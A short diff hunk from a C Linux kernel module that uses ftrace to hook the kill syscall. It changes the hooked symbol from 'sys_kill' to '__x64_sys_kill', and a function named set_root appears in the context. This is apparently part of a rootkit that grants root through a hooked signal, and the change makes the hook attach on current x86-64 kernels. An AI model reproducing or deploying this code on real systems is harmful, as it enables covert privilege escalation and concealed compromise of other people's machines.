@@ -90,7 +90,7 @@ void set_root(void)
 
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
 
 /* Module initialization function */
